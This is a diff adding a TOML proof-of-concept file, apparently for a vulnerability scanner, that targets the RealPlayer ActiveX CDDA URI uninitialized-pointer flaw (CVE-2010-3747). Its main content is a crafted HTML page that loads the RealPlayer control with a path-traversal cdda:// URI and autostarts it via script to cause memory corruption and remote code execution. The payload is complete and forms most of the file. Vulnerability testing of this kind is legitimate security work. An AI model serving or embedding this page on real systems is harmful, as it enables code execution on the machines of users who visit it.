@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "通过 HTTP 服务端返回恶意 HTML 页面，利用 RealPlayer ActiveX 控件处理 CDDA URI 时的未初始化指针漏洞触发远程代码执行。用户访问该页面后 RealPlayer 解析特制 CDDA URI 导致内存破坏。"
+id = "POC-AVE-2010-0235"
+name = "RealNetworks RealPlayer CDDA URI 未初始化指针远程代码执行漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2010-3747",
+    "realplayer",
+    "activex",
+    "cdda",
+]
+vuln_id = [
+    "CVE-2010-3747",
+    "AVE-2010-0235",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html><body>
+<object classid="clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA" id="RealPlayer">
+<param name="src" value="cdda://../../../../../../../../../../Program%20Files/Real/RealPlayer/rpplugins/rmoc3260.dll">
+<param name="controls" value="ImageWindow">
+<param name="autostart" value="true">
+</object>
+<script>document.getElementById('RealPlayer').DoAutoStart();</script>
+</body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["RealPlayer"]
